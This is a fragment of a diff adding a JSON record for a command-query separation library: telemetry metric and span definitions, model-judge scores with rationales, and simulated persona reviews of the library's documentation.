+        "name": "cqs.queries.answered",
+        "metric_type": "counter",
+        "unit": "1",
+        "cardinality_bound": 50,
+        "label_keys": [
+          "query_type"
+        ]
+      },
+      {
+        "name": "cqs.command.duration",
+        "metric_type": "histogram",
+        "unit": "ms",
+        "cardinality_bound": 200,
+        "label_keys": [
+          "command_type"
+        ]
+      },
+      {
+        "name": "cqs.query.duration",
+        "metric_type": "histogram",
+        "unit": "ms",
+        "cardinality_bound": 200,
+        "label_keys": [
+          "query_type"
+        ]
+      }
+    ],
+    "spans": [
+      {
+        "operation_name": "cqs.command.dispatch",
+        "required_attributes": [
+          "cqs.command_type",
+          "cqs.status"
+        ]
+      },
+      {
+        "operation_name": "cqs.query.answer",
+        "required_attributes": [
+          "cqs.query_type"
+        ]
+      },
+      {
+        "operation_name": "cqs.handler.register",
+        "required_attributes": [
+          "cqs.role",
+          "cqs.type_name"
+        ]
+      }
+    ]
+  },
+  "judge": {
+    "judge_model": "claude-opus-4-7",
+    "axes": [
+      {
+        "axis": "fidelity",
+        "score": 9,
+        "rationale": "Protocol mirrors catalog api_signature exactly; runtime_checkable; InMemoryCQS implements all four methods with correct semantics. CommandAck/ack-envelope matches spec's allowed keys."
+      },
+      {
+        "axis": "completeness",
+        "score": 9,
+        "rationale": "All 4 invariants have runtime enforcement: INV-01 via validate_ack_payload, INV-02 via pre/post delta checks, INV-03 via duplicate-registration guard, INV-04 via EventStream subscription + direct_write tripwire."
+      },
+      {
+        "axis": "error_quality",
+        "score": 9,
+        "rationale": "Dedicated CQSInvariantError subclass; every raise cites the invariant ID, the forbidden condition, and observed values (extra keys, status, type names, offsets). Messages are actionable."
+      },
+      {
+        "axis": "composability",
+        "score": 8,
+        "rationale": "Constructor accepts optional EventStream for adapter swap; read_models/event_stream/command_types/query_types exposed; Protocol is runtime_checkable. Minor: no decorator sugar mentioned in extension_contract, but registration API suffices."
+      },
+      {
+        "axis": "production_readiness",
+        "score": 8,
+        "rationale": "Thread-safe locks on registries and stream; monotonic offsets; zero I/O at import; lazy subscriber snapshot avoids callback-under-lock. INV-02 check is structural (size deltas) not deep; acceptable for in-process reference."
+      },
+      {
+        "axis": "catalog_conformance",
+        "score": 9,
+        "rationale": "Namespace api.CommandQuerySeparator; Protocol signature verbatim; invariant wording preserved and cited by ID in docstrings and error messages; __all__ exports the public surface."
+      }
+    ]
+  },
+  "personas": {
+    "reviews": [
+      {
+        "persona": "junior_dev",
+        "understood": true,
+        "friction_points": [
+          "Glossary introduces 'event sourcing', 'CQRS', and 'projection' before the hello-world example, front-loading jargon that blocks reading; the example itself doesn't use them.",
+          "The CommandAck table appears after the API surface prose but before the invariants \u2014 the reader needs to cross-reference three sections just to know what to return from a command handler.",
+          "The phrase 'bounded-key dict' in the API surface section is undefined; a junior will not know whether it means 'a subset of ACK_ALLOWED_KEYS' or something else."
+        ],
+        "rewrite_suggestion": "Move the hello-world block to the very top (before Purpose). Inline a one-line tooltip for each glossary term the first time it appears in the example. Replace 'bounded-key dict' with 'a dict whose keys must be a subset of ACK_ALLOWED_KEYS (see table below)'."
+      },
+      {
+        "persona": "principal_engineer",
+        "understood": true,
+        "friction_points": [
+          "The Protocol declaration is punted to 'CommandQuerySeparator.contract.json' without showing the interface; there is no way to evaluate the actual method signatures, return types, or overloads from the docs alone.",
+          "'query handlers return an arbitrary projection' \u2014 no typing hint or constraint is given; it is unclear whether handlers may return generators, async iterables, or only serialisable dicts.",
+          "Thread-safety claim for handler registration ('one wins, others raise CQS-INV-03') contradicts the invariant definition ('duplicate registration is FORBIDDEN'); it is unclear whether the second registration silently raises or propagates."
+        ],
+        "rewrite_suggestion": "Inline the four method signatures with Python type annotations directly in the API surface section. Clarify query return type (e.g., 'JSON-serialisable dict or Pydantic model'). Resolve the 'one wins / FORBIDDEN' wording: state explicitly that the second call always raises and is never silently dropped."
+      },
+      {
+        "persona": "security_auditor",
+        "understood": true,
+        "friction_points": [
+          "The authorization split guidance says middleware 'MUST check the role against different policies' but gives no enforcement hook, no example middleware stub, and no explanation of how the CQS boundary exposes the command/query role to the authz layer.",
+          "'ReadModel.direct_write is a tripwire that always raises' \u2014 there is no threat model statement: who can reach this path (internal callers only? external? deserialization?).",
+          "No mention of input validation or schema enforcement on command payloads before they reach handlers \u2014 the hello-world example takes raw constructor arguments with no sanitization note."
+        ],
+        "rewrite_suggestion": "Add a 'Threat model' subsection (two sentences: trust boundary, attack surface). Show the middleware hook signature so auditors can verify the command/query role is propagated. Add a one-liner note that command payload validation is the caller's responsibility and point to the schema in contract.json."
+      },
+      {
+        "persona": "sre",
+        "understood": true,
+        "friction_points": [
+          "Two metric names are given ('cqs.commands.dispatched', 'cqs.command.duration') but no equivalent query-path metrics are named, making the read-side invisible to dashboards.",
+          "The read-model lag formula ('EventStream.events[-1].offset minus ReadModel._event_offset') references a private attribute (_event_offset) with a leading underscore \u2014 unclear whether this is a stable, instrumentable surface or an implementation detail.",
+          "No SLO targets, alert thresholds, or on-call runbook reference are provided; 'Read-model lag is the primary SLO' is stated but no example threshold or escalation path is given."
+        ],
+        "rewrite_suggestion": "Add a metrics table covering both command and query paths (dispatched, duration, error_rate, cache_hit_rate for queries). Expose read-model lag as a public property (e.g., ReadModel.lag_offsets) rather than a private attribute calculation. Add a two-line 'SLO baseline' example (e.g., p99 command dispatch < 50 ms, lag < 500 ms) and a pointer to dashboard.json."
+      },
+      {
+        "persona": "pm",
+        "understood": true,
+        "friction_points": [
+          "'Compile-time-visible, run-time-checked contract' is misleading in a Python context \u2014 Python has no compile step; this will cause PMs to over-promise static safety guarantees to stakeholders.",
+          "The 'Alternatives considered' section is purely technical (ORM, GraphQL) with no business impact statement; a PM cannot use it to justify the adoption cost to non-technical leadership.",
+          "No adoption cost or migration story is mentioned \u2014 the docs don't answer 'how long does it take to introduce CQS into an existing service?' which is the first question a PM will ask."
+        ],
+        "rewrite_suggestion": "Replace 'compile-time-visible' with 'enforced at registration time, not at call time'. Add one business-impact sentence per alternative (e.g., 'GraphQL without CQS: authorisation audits take 3\u00d7 longer because mutation surface is hidden'). Add a 'Adoption cost' note: 'Introducing CQS into an existing service requires extracting command and query handlers \u2014 typically a 1\u20132 sprint refactor for a mid-size domain.'"
+      }
+    ]
+  }
+}
